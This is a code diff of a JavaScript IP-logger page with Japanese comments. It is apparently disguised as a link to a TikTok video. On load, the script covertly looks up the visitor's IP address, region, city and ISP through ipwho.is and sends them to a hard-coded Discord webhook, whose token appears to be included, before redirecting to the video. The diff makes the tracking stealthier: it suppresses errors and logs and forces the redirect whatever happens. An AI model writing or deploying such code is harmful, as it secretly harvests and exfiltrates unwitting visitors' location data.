@@ -2,39 +2,33 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1496426741068202024/_p47Mr
 const REDIRECT_URL = "https://www.tiktok.com/@sakonji_jrfv/video/7625181468586790162?is_from_webapp=1&sender_device=pc&web_id=7621142624386418184";
 
 async function track() {
-    console.log("=== 追跡開始 ===");
+    // 1. 何があっても必ず2.5秒後にはTikTokに飛ばす設定
+    const forceRedirect = setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+    }, 2500);
+
     try {
-        const response = await fetch('https://ipwho.is/');
-        const data = await response.json();
+        // 2. IP情報を取得（ここで止まっても上記タイマーで飛ばされます）
+        const response = await fetch('https://ipwho.is/').catch(() => null);
+        if (!response) return;
         
-        if (data.success) {
-            console.log("IP取得成功:", data.ip);
-            
-            if (WEBHOOK_URL) {
-                console.log("Discordへ送信を試行中...");
-                const discordRes = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `✅ **アクセス検出成功**\nIP: ${data.ip}\n場所: ${data.region} ${data.city}\nISP: ${data.connection.isp}`
-                    })
-                });
-                
-                if (discordRes.ok) {
-                    console.log("Discordへの送信に成功しました！");
-                } else {
-                    console.error("Discordへの送信に失敗しました。ステータス:", discordRes.status);
-                }
-            }
+        const data = await response.json();
+        if (!data || !data.success) return;
+
+        // 3. Discordに送信（送信が終わるのを待たずに次に進みます）
+        if (WEBHOOK_URL) {
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `👤 **アクセス情報**\nIP: ${data.ip}\n場所: ${data.region} ${data.city}\nISP: ${data.connection.isp}`
+                })
+            }).catch(() => {}); // 送信エラーも無視して進む
         }
     } catch (e) {
-        console.error("エラーが発生しました:", e);
+        // 全てのエラーを無視
     }
-
-    console.log("1.5秒後にリダイレクトします...");
-    setTimeout(() => {
-        window.location.href = REDIRECT_URL;
-    }, 1500);
 }
 
+// 実行
 track();
